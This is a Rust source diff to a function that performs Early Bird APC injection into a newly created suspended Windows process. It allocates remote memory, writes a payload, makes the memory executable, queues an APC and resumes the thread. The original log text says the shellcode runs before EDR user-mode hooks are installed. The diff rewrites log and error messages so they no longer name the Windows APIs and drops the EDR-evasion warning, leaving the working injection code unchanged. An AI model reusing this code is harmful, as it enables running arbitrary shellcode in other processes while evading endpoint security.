@@ -52,7 +52,7 @@ pub fn live_inject(
     let size = wrapped.len();
 
     log.step(format!(
-        "[1/6] CreateProcessW(\"{}\") — CREATE_SUSPENDED",
+        "[1/6] Create suspended process (\"{}\")",
         target_exe
     ));
 
@@ -79,7 +79,7 @@ pub fn live_inject(
     };
     if created == 0 {
         return Err(format!(
-            "CreateProcessW failed — check that \"{}\" exists and is executable",
+            "process creation failed — check that \"{}\" exists and is executable",
             target_exe
         ));
     }
@@ -92,7 +92,7 @@ pub fn live_inject(
     let thread = pi.h_thread;
 
     let cleanup_kill = |log: &LogSink| {
-        log.detail("[cleanup] TerminateProcess — killing spawned process");
+        log.detail("[cleanup] Killing spawned process");
         unsafe {
             resolve::TerminateProcess(process, 1);
             resolve::CloseHandle(thread);
@@ -100,10 +100,7 @@ pub fn live_inject(
         }
     };
 
-    log.step(format!(
-        "[2/6] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE ({} bytes)",
-        size
-    ));
+    log.step(format!("[2/6] Allocate remote memory ({} bytes)", size));
     let base = unsafe {
         resolve::VirtualAllocEx(
             process,
@@ -115,14 +112,14 @@ pub fn live_inject(
     };
     if base.is_null() {
         cleanup_kill(log);
-        return Err("VirtualAllocEx returned NULL — allocation failed".to_string());
+        return Err("remote allocation failed".to_string());
     }
     log.info(format!(
         "      allocated RW region at remote address {:#p} ({} bytes)",
         base, size
     ));
 
-    log.step(format!("[3/6] WriteProcessMemory — {} bytes", size));
+    log.step(format!("[3/6] Write {} bytes", size));
     let mut written: usize = 0;
     let ok = unsafe {
         resolve::WriteProcessMemory(
@@ -136,11 +133,11 @@ pub fn live_inject(
     if ok == 0 {
         unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
-        return Err("WriteProcessMemory failed".to_string());
+        return Err("remote write failed".to_string());
     }
     log.info(format!("      wrote {} bytes", written));
 
-    log.step("[4/6] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ");
+    log.step("[4/6] Set memory protection");
     let mut old_protect: u32 = 0;
     let ok = unsafe {
         resolve::VirtualProtectEx(
@@ -154,31 +151,30 @@ pub fn live_inject(
     if ok == 0 {
         unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
-        return Err("VirtualProtectEx failed".to_string());
+        return Err("memory protection change failed".to_string());
     }
     log.info(format!(
         "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
         old_protect
     ));
 
-    log.step("[5/6] QueueUserAPC — queuing to suspended main thread");
+    log.step("[5/6] Queue APC to suspended main thread");
     let apc_func = base as *const c_void;
     if unsafe { resolve::QueueUserAPC(apc_func, thread, 0) } == 0 {
         unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
-        return Err("QueueUserAPC failed on suspended main thread".to_string());
+        return Err("APC queue failed on suspended main thread".to_string());
     }
     log.info("      APC queued to main thread");
 
-    log.step("[6/6] ResumeThread — thread initializes, APC fires before EDR hooks install");
+    log.step("[6/6] Resume thread — APC fires during init");
     unsafe { resolve::ResumeThread(thread) };
     unsafe { resolve::CloseHandle(thread) };
     unsafe { resolve::CloseHandle(process) };
 
     log.info("      main thread resumed — APC fires during process init");
-    log.warning("      shellcode runs BEFORE EDR user-mode hooks are established");
     log.info(format!(
-        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
+        "      payload at {:#p} ({} bytes, wrapped {}+38)",
         base,
         size,
         size - 38
@@ -195,5 +191,5 @@ pub fn live_inject(
     _target_exe: &str,
     _log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
+    Err("requires Windows".to_string())
 }
